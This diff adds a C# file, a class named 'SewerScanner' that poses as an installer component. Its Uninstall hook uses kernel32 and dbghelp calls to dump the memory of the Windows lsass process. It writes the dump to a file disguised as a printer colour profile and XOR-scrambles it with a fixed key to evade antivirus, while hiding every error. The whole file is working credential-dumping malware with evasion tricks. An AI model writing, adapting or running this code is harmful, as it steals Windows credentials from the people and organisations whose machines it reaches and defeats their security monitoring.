@@ -1,0 +1,50 @@
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.ComponentModel;
+using System.Configuration.Install;
+
+[RunInstaller(true)]
+public class SewerScanner : Installer {
+
+    public delegate bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
+
+    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);
+
+    public override void Uninstall(System.Collections.IDictionary savedState) {
+        base.Uninstall(savedState);
+        string path = @"C:\Windows\System32\spool\drivers\color\ExpressColor_v4.dat";
+        DumpLsass(path);
+        ScrambleFile(path);
+    }
+
+    private void DumpLsass(string path) {
+        try {
+            Process[] processes = Process.GetProcessesByName("lsass");
+            uint pid = (uint)processes[0].Id;
+            IntPtr hProcess = OpenProcess(0x0410, false, pid);
+
+            IntPtr hDbgHelp = GetModuleHandle("dbghelp.dll");
+            IntPtr pFunction = GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
+            MiniDumpWriteDump dump = (MiniDumpWriteDump)Marshal.GetDelegateForFunctionPointer(pFunction, typeof(MiniDumpWriteDump));
+
+            using (FileStream fs = new FileStream(path, FileMode.Create)) {
+                dump(hProcess, pid, fs.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+            }
+        } catch { }
+    }
+
+    private void ScrambleFile(string path) {
+        byte[] key = { 0xDE, 0xAD, 0xBE, 0xEF }; // Your secret key
+        byte[] data = File.ReadAllBytes(path);
+
+        for (int i = 0; i < data.Length; i++) {
+            data[i] = (byte)(data[i] ^ key[i % key.Length]);
+        }
+
+        File.WriteAllBytes(path, data); // Overwrite the original with scrambled data
+    }
+}
